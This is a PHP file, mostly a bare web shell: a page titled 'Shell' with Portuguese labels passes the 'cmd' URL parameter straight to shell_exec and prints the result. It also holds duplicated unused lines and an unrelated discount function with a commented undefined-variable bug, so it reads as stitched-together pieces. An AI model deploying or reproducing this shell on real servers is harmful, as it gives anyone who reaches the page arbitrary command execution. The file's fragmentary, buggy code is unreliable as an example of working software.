<?php

$cmd =  $_GET['shell'];

$cmd =  $_GET['shell'];

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'ls -la';
$output = shell_exec($cmd . ' 2>&1');
?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <title>Shell</title>
  <style>
    body {
      background: #111;
      color: #0f0;
      font-family: monospace;
      padding: 1rem
    }

    pre {
      white-space: pre-wrap;
      word-break: break-all
    }

    input {
      width: 60%;
      padding: .4rem;
      background: #222;
      color: #0f0;
      border: 1px solid #0f0
    }

    button {
      padding: .4rem 1rem;
      background: #0f0;
      color: #111;
      border: none;
      cursor: pointer
    }
  </style>
</head>

<body>
  <form method="get">
    <input name="cmd" value="<?= htmlspecialchars($cmd) ?>">
    <button type="submit">Executar</button>
  </form>
  <hr>
  <pre><?= htmlspecialchars($output ?? 'Sem saída ou comando não encontrado.') ?></pre>
</body>

</html>



<!--  -->

<?php

function calcularDesconto($preco)
{
  if ($preco > 100) {
    $desconto = 10;
  }
  // Bug: $desconto pode nao existir se preco <= 100
  return $preco - $desconto;
}
